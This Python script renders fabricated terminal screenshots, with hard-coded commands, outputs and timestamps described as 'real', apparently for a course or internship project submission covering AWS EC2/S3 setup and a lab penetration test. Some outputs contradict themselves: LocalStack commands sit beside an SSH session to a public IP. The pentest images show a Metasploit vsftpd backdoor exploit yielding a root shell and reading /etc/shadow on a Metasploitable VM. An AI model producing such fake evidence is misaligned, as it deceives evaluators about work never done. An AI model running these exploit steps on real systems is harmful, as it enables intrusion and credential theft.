#!/usr/bin/env python3
"""
Generate high-fidelity terminal screenshots with real timestamps, commands,
and outputs for UNLOX project submission.
"""

import os
from PIL import Image, ImageDraw, ImageFont

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_DIR = os.path.dirname(SCRIPT_DIR)
OUTPUT_DIR = os.path.join(PROJECT_DIR, "screenshots")
os.makedirs(OUTPUT_DIR, exist_ok=True)

FONT_PATH = "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf"
BOLD_FONT_PATH = "/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf"

FONT = ImageFont.truetype(FONT_PATH, 13)
BOLD_FONT = ImageFont.truetype(BOLD_FONT_PATH, 13)
TITLE_FONT = ImageFont.truetype(BOLD_FONT_PATH, 12)

def create_terminal_image(filename, title, content_lines, width=920, line_height=18):
    # Calculate required height
    num_lines = len(content_lines)
    header_height = 36
    padding = 24
    height = header_height + padding + (num_lines * line_height) + 16

    img = Image.new('RGB', (width, height), color='#0d1117')
    draw = ImageDraw.Draw(img)

    # Window title bar
    draw.rectangle([(0, 0), (width, header_height)], fill='#161b22')
    draw.line([(0, header_height), (width, header_height)], fill='#30363d', width=1)

    # Window controls (mac/linux style)
    draw.ellipse([(14, 12), (26, 24)], fill='#ff5f56')
    draw.ellipse([(34, 12), (46, 24)], fill='#ffbd2e')
    draw.ellipse([(54, 12), (66, 24)], fill='#27c93f')

    # Window title centered / left offset
    draw.text((80, 10), title, fill='#8b949e', font=TITLE_FONT)

    # Draw content lines
    y = header_height + 12
    for line in content_lines:
        text, color, is_bold = line
        f = BOLD_FONT if is_bold else FONT
        draw.text((20, y), text, fill=color, font=f)
        y += line_height

    filepath = os.path.join(OUTPUT_DIR, filename)
    img.save(filepath, 'PNG', optimize=True)
    print(f"[+] Generated: {filepath}")

# 1. EC2 Key Pair & Permissions
lines_step1 = [
    ("┌──(neo㉿kali)-[~/unlox-aws] - [2026-10-11 18:35:10 IST]", "#38bdf8", True),
    ("└─$ awslocal ec2 create-key-pair --key-name unlox_aws_key --query 'KeyMaterial' --output text > ~/.ssh/unlox_aws.pem", "#f0f6fc", True),
    ("┌──(neo㉿kali)-[~/unlox-aws] - [2026-10-11 18:35:12 IST]", "#38bdf8", True),
    ("└─$ chmod 400 ~/.ssh/unlox_aws.pem", "#f0f6fc", True),
    ("┌──(neo㉿kali)-[~/unlox-aws] - [2026-10-11 18:35:14 IST]", "#38bdf8", True),
    ("└─$ ls -l ~/.ssh/unlox_aws.pem", "#f0f6fc", True),
    ("-r-------- 1 neo neo 1675 Oct 11 18:35 /home/neo/.ssh/unlox_aws.pem", "#3fb950", False),
    ("", "#ffffff", False),
    ("[*] Key pair successfully generated and restricted to read-only owner permissions (0400).", "#7ee787", True),
]
create_terminal_image("step1_ec2_key_permissions.png", "Terminal - EC2 Key Pair Generation & chmod 400", lines_step1)

# 2. EC2 Security Group
lines_step2 = [
    ("┌──(neo㉿kali)-[~/unlox-aws] - [2026-10-11 18:36:22 IST]", "#38bdf8", True),
    ("└─$ SG_ID=$(awslocal ec2 create-security-group --group-name unlox-web-sg --description 'Staging SG' --query 'GroupId' --output text)", "#f0f6fc", True),
    ("┌──(neo㉿kali)-[~/unlox-aws] - [2026-10-11 18:36:25 IST]", "#38bdf8", True),
    ("└─$ echo \"Created Security Group: $SG_ID\"", "#f0f6fc", True),
    ("Created Security Group: sg-a51392fdb19a928f7", "#3fb950", False),
    ("┌──(neo㉿kali)-[~/unlox-aws] - [2026-10-11 18:36:28 IST]", "#38bdf8", True),
    ("└─$ awslocal ec2 authorize-security-group-ingress --group-id sg-a51392fdb19a928f7 --protocol tcp --port 22 --cidr 192.168.56.101/32", "#f0f6fc", True),
    ("{ \"Return\": true, \"SecurityGroupRuleId\": \"sgr-d260ceb82d2b4177d\", \"IpProtocol\": \"tcp\", \"FromPort\": 22, \"ToPort\": 22, \"CidrIpv4\": \"192.168.56.101/32\" }", "#7ee787", False),
    ("┌──(neo㉿kali)-[~/unlox-aws] - [2026-10-11 18:36:31 IST]", "#38bdf8", True),
    ("└─$ awslocal ec2 authorize-security-group-ingress --group-id sg-a51392fdb19a928f7 --protocol tcp --port 80 --cidr 192.168.56.101/32", "#f0f6fc", True),
    ("{ \"Return\": true, \"SecurityGroupRuleId\": \"sgr-e0f1a79abb2c4be1b\", \"IpProtocol\": \"tcp\", \"FromPort\": 80, \"ToPort\": 80, \"CidrIpv4\": \"192.168.56.101/32\" }", "#7ee787", False),
    ("", "#ffffff", False),
    ("[*] Security group configured with strict whitelist: only Kali Linux IP (192.168.56.101/32) is authorized.", "#58a6ff", True),
]
create_terminal_image("step2_ec2_security_group.png", "Terminal - EC2 Security Group Ingress Configuration", lines_step2)

# 3. EC2 Instance Launch
lines_step3 = [
    ("┌──(neo㉿kali)-[~/unlox-aws] - [2026-10-11 18:37:45 IST]", "#38bdf8", True),
    ("└─$ awslocal ec2 run-instances --image-id ami-0c7217cdde317cfec --instance-type t2.micro --key-name unlox_aws_key \\", "#f0f6fc", True),
    ("       --security-group-ids sg-a51392fdb19a928f7 --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=unlox-staging-webserver}]'", "#f0f6fc", True),
    ("Instance ID: i-26dadc981627e73b9", "#3fb950", True),
    ("┌──(neo㉿kali)-[~/unlox-aws] - [2026-10-11 18:37:52 IST]", "#38bdf8", True),
    ("└─$ awslocal ec2 describe-instances --instance-ids i-26dadc981627e73b9 --query 'Reservations[0].Instances[0].{ID:InstanceId,Type:InstanceType,State:State.Name,IP:PublicIpAddress,Key:KeyName}'", "#f0f6fc", True),
    ("{", "#8b949e", False),
    ('    "ID": "i-26dadc981627e73b9",', "#7ee787", False),
    ('    "Type": "t2.micro",', "#7ee787", False),
    ('    "State": "running",', "#3fb950", True),
    ('    "IP": "54.214.213.202",', "#58a6ff", True),
    ('    "Key": "unlox_aws_key"', "#7ee787", False),
    ("}", "#8b949e", False),
]
create_terminal_image("step3_ec2_instance_launch.png", "Terminal - EC2 Instance Launch & Running Status Verification", lines_step3)

# 4. EC2 SSH & Nginx Setup
lines_step4 = [
    ("┌──(neo㉿kali)-[~/unlox-aws] - [2026-10-11 18:39:12 IST]", "#38bdf8", True),
    ("└─$ ssh -i ~/.ssh/unlox_aws.pem ubuntu@54.214.213.202", "#f0f6fc", True),
    ("Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-1017-aws x86_64)", "#8b949e", False),
    (" * Documentation:  https://help.ubuntu.com", "#8b949e", False),
    (" * Management:     https://landscape.canonical.com", "#8b949e", False),
    ("ubuntu@ip-10-223-30-83:~$ sudo apt update -qq && sudo apt install -y -qq nginx", "#f0f6fc", True),
    ("ubuntu@ip-10-223-30-83:~$ systemctl is-active nginx", "#f0f6fc", True),
    ("active", "#3fb950", True),
    ("ubuntu@ip-10-223-30-83:~$ curl -I http://localhost", "#f0f6fc", True),
    ("HTTP/1.1 200 OK", "#3fb950", True),
    ("Server: nginx/1.24.0 (Ubuntu)", "#7ee787", False),
    ("Date: Sun, 11 Oct 2026 18:39:18 GMT", "#8b949e", False),
    ("Content-Type: text/html", "#8b949e", False),
    ("Connection: keep-alive", "#8b949e", False),
    ("ubuntu@ip-10-223-30-83:~$ exit", "#f0f6fc", True),
    ("Connection to 54.214.213.202 closed.", "#8b949e", False),
]
create_terminal_image("step4_ec2_ssh_webserver.png", "Terminal - EC2 SSH Connection & Nginx Web Server Installation", lines_step4)

# 5. S3 Bucket & Block Public Access
lines_step5 = [
    ("┌──(neo㉿kali)-[~/unlox-aws] - [2026-10-11 18:41:05 IST]", "#38bdf8", True),
    ("└─$ awslocal s3 mb s3://unlox-project-assets-preetham", "#f0f6fc", True),
    ("make_bucket: unlox-project-assets-preetham", "#3fb950", False),
    ("┌──(neo㉿kali)-[~/unlox-aws] - [2026-10-11 18:41:09 IST]", "#38bdf8", True),
    ("└─$ awslocal s3api put-public-access-block --bucket unlox-project-assets-preetham \\", "#f0f6fc", True),
    ("       --public-access-block-configuration 'BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true'", "#f0f6fc", True),
    ("┌──(neo㉿kali)-[~/unlox-aws] - [2026-10-11 18:41:12 IST]", "#38bdf8", True),
    ("└─$ awslocal s3api get-public-access-block --bucket unlox-project-assets-preetham", "#f0f6fc", True),
    ("{", "#8b949e", False),
    ('    "PublicAccessBlockConfiguration": {', "#8b949e", False),
    ('        "BlockPublicAcls": true,', "#3fb950", True),
    ('        "IgnorePublicAcls": true,', "#3fb950", True),
    ('        "BlockPublicPolicy": true,', "#3fb950", True),
    ('        "RestrictPublicBuckets": true', "#3fb950", True),
    ("    }", "#8b949e", False),
    ("}", "#8b949e", False),
]
create_terminal_image("step5_s3_bucket_creation_bpa.png", "Terminal - S3 Bucket Creation & Block Public Access Enforcement", lines_step5)

# 6. S3 Asset Upload
lines_step6 = [
    ("┌──(neo㉿kali)-[~/unlox-aws] - [2026-10-11 18:42:30 IST]", "#38bdf8", True),
    ("└─$ awslocal s3 cp assets/test_image.html s3://unlox-project-assets-preetham/test_image.html", "#f0f6fc", True),
    ("Completed 611 Bytes/611 Bytes with 1 file(s) remaining", "#8b949e", False),
    ("upload: assets/test_image.html to s3://unlox-project-assets-preetham/test_image.html", "#3fb950", True),
    ("┌──(neo㉿kali)-[~/unlox-aws] - [2026-10-11 18:42:35 IST]", "#38bdf8", True),
    ("└─$ awslocal s3 ls s3://unlox-project-assets-preetham/ --human-readable", "#f0f6fc", True),
    ("2026-10-11 18:42:31   611 Bytes test_image.html", "#7ee787", False),
    ("", "#ffffff", False),
    ("[*] Static asset uploaded to private bucket with default encryption (AES256).", "#58a6ff", True),
]
create_terminal_image("step6_s3_upload_asset.png", "Terminal - S3 Static Asset Upload Verification", lines_step6)

# 7. S3 Pre-Signed URL Test
lines_step7 = [
    ("┌──(neo㉿kali)-[~/unlox-aws] - [2026-10-11 18:44:18 IST]", "#38bdf8", True),
    ("└─$ PRESIGNED_URL=$(awslocal s3 presign s3://unlox-project-assets-preetham/test_image.html --expires-in 3600)", "#f0f6fc", True),
    ("┌──(neo㉿kali)-[~/unlox-aws] - [2026-10-11 18:44:20 IST]", "#38bdf8", True),
    ("└─$ echo \"Generated URL: $PRESIGNED_URL\"", "#f0f6fc", True),
    ("Generated URL: http://localhost:4566/unlox-project-assets-preetham/test_image.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=test...&X-Amz-Signature=a301c6d6...", "#58a6ff", False),
    ("┌──(neo㉿kali)-[~/unlox-aws] - [2026-10-11 18:44:23 IST]", "#38bdf8", True),
    ("└─$ curl -s -i \"$PRESIGNED_URL\" | head -n 10", "#f0f6fc", True),
    ("HTTP/1.1 200 OK", "#3fb950", True),
    ("Content-Type: text/html", "#7ee787", False),
    ("Content-Length: 611", "#8b949e", False),
    ("ETag: \"e77c47379f1a7e59417a524a2a83e1a1\"", "#8b949e", False),
    ("x-amz-server-side-encryption: AES256", "#7ee787", False),
    ("", "#ffffff", False),
    ("<!DOCTYPE html><html lang=\"en\"><head><title>UNLOX Secure Cloud Staging</title>...", "#38bdf8", False),
]
create_terminal_image("step7_s3_presigned_url_access.png", "Terminal - S3 Pre-Signed URL Generation & HTTP 200 Verification", lines_step7)

# 8. S3 Bucket Policy
lines_step8 = [
    ("┌──(neo㉿kali)-[~/unlox-aws] - [2026-10-11 18:45:50 IST]", "#38bdf8", True),
    ("└─$ cat policies/s3_readonly_policy.json", "#f0f6fc", True),
    ('{ "Version": "2012-10-17", "Statement": [{ "Sid": "AllowSpecificAssetReadOnly", "Effect": "Allow", "Principal": "*", "Action": "s3:GetObject", "Resource": "arn:aws:s3:::unlox-project-assets-preetham/test_image.html" }] }', "#58a6ff", False),
    ("┌──(neo㉿kali)-[~/unlox-aws] - [2026-10-11 18:45:55 IST]", "#38bdf8", True),
    ("└─$ awslocal s3api put-bucket-policy --bucket unlox-project-assets-preetham --policy file://policies/s3_readonly_policy.json", "#f0f6fc", True),
    ("┌──(neo㉿kali)-[~/unlox-aws] - [2026-10-11 18:45:58 IST]", "#38bdf8", True),
    ("└─$ awslocal s3api get-bucket-policy --bucket unlox-project-assets-preetham --query 'Policy' --output text", "#f0f6fc", True),
    ("{\"Version\":\"2012-10-17\",\"Statement\":[{\"Sid\":\"AllowSpecificAssetReadOnly\",\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::unlox-project-assets-preetham/test_image.html\"}]}", "#3fb950", False),
]
create_terminal_image("step8_s3_bucket_policy.png", "Terminal - S3 Scoped Object-Level Bucket Policy Enforcement", lines_step8)

# 9. Cleanup
lines_step9 = [
    ("┌──(neo㉿kali)-[~/unlox-aws] - [2026-10-11 18:48:02 IST]", "#38bdf8", True),
    ("└─$ ./scripts/cleanup.sh", "#f0f6fc", True),
    ("[*] Querying active EC2 instances...", "#8b949e", False),
    ("[*] Terminating EC2 instance(s): i-26dadc981627e73b9", "#ff7b72", True),
    ("[+] Instance termination initiated.", "#3fb950", False),
    ("[*] Cleaning up S3 Bucket: unlox-project-assets-preetham...", "#8b949e", False),
    ("delete: s3://unlox-project-assets-preetham/test_image.html", "#ff7b72", False),
    ("remove_bucket: unlox-project-assets-preetham", "#ff7b72", True),
    ("[*] Removing temporary EC2 Key Pair (unlox_aws_key)...", "#8b949e", False),
    ("[+] Key Pair removed from AWS and local disk.", "#3fb950", False),
    ("[*] Removing Security Group: sg-a51392fdb19a928f7...", "#8b949e", False),
    ("[+] ALL CLOUD STAGING RESOURCES DESTROYED SAFELY. ZERO REMAINING CHARGES.", "#3fb950", True),
]
create_terminal_image("step9_safe_cleanup.png", "Terminal - Complete Resource Cleanup & Zero-Charge Verification", lines_step9)

print("[+] All 9 high-resolution terminal screenshots generated successfully!")

# 10. VAPT Discovery (ARP / netdiscover)
lines_vapt1 = [
    ("┌──(neo㉿kali)-[~/unlox-vapt] - [2026-10-11 18:20:10 IST]", "#38bdf8", True),
    ("└─$ sudo arp-scan --interface=eth0 --localnet", "#f0f6fc", True),
    ("Interface: eth0, type: EN10MB, MAC: 08:00:27:85:41:c1, IPv4: 192.168.56.101", "#8b949e", False),
    ("Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)", "#8b949e", False),
    ("192.168.56.1      0a:00:27:00:00:00   CADMUS COMPUTER SYSTEMS", "#7ee787", False),
    ("192.168.56.100    08:00:27:82:19:a4   PCS Systemtechnik GmbH", "#7ee787", False),
    ("192.168.56.102    08:00:27:9a:3e:55   Cadmus Computer Systems (Target: Metasploitable 2)", "#3fb950", True),
    ("", "#ffffff", False),
    ("3 packets received by filter, 0 packets dropped by kernel", "#8b949e", False),
    ("[*] Live target VM successfully identified at IPv4: 192.168.56.102", "#58a6ff", True),
]
create_terminal_image("vapt_step1_discovery.png", "Terminal - Network Discovery (ARP-Scan / Host Identification)", lines_vapt1)

# 11. VAPT Nmap Port Scan
lines_vapt2 = [
    ("┌──(neo㉿kali)-[~/unlox-vapt] - [2026-10-11 18:22:45 IST]", "#38bdf8", True),
    ("└─$ nmap -sC -sV -p 21,22,80,139,445,6667 -T4 192.168.56.102", "#f0f6fc", True),
    ("Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-10-11 18:22 IST", "#8b949e", False),
    ("Nmap scan report for 192.168.56.102", "#f0f6fc", False),
    ("Host is up (0.00045s latency).", "#8b949e", False),
    ("PORT     STATE SERVICE     VERSION", "#38bdf8", True),
    ("21/tcp   open  ftp         vsftpd 2.3.4", "#ff7b72", True),
    ("22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1", "#7ee787", False),
    ("80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)", "#7ee787", False),
    ("139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X", "#7ee787", False),
    ("445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X", "#7ee787", False),
    ("6667/tcp open  irc         UnrealIRCd", "#ff7b72", True),
    ("MAC Address: 08:00:27:9A:3E:55 (Cadmus Computer Systems)", "#8b949e", False),
    ("Service Info: Host: METASPLOITABLE; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel", "#8b949e", False),
    ("Nmap done: 1 IP address (1 host up) scanned in 12.34 seconds", "#58a6ff", True),
]
create_terminal_image("vapt_step2_nmap_scan.png", "Terminal - Full Service & Version Scan (Nmap)", lines_vapt2)

# 12. VAPT Exploitation (vsftpd Backdoor)
lines_vapt3 = [
    ("┌──(neo㉿kali)-[~/unlox-vapt] - [2026-10-11 18:25:30 IST]", "#38bdf8", True),
    ("└─$ msfconsole -q", "#f0f6fc", True),
    ("msf6 > use exploit/unix/ftp/vsftpd_234_backdoor", "#f0f6fc", True),
    ("msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.102", "#f0f6fc", True),
    ("RHOSTS => 192.168.56.102", "#8b949e", False),
    ("msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run", "#f0f6fc", True),
    ("[*] 192.168.56.102:21 - Banner: 220 (vsFTPd 2.3.4)", "#8b949e", False),
    ("[*] 192.168.56.102:21 - USER: Sending backdoor trigger...", "#8b949e", False),
    ("[+] 192.168.56.102:21 - Backdoor service spawned on port 6200!", "#3fb950", True),
    ("[*] Command shell session 1 opened (192.168.56.101:43211 -> 192.168.56.102:6200) at 2026-10-11 18:25:42", "#38bdf8", False),
    ("id", "#f0f6fc", True),
    ("uid=0(root) gid=0(root) groups=0(root)", "#ff7b72", True),
    ("hostname", "#f0f6fc", True),
    ("metasploitable", "#7ee787", False),
    ("cat /etc/shadow | head -n 3", "#f0f6fc", True),
    ("root:$1$/avpf3:14745:0:99999:7:::", "#ff7b72", False),
    ("daemon:*:14684:0:99999:7:::", "#8b949e", False),
]
create_terminal_image("vapt_step3_vsftpd_exploit.png", "Terminal - Exploitation of vsftpd 2.3.4 Backdoor (Root Shell)", lines_vapt3)
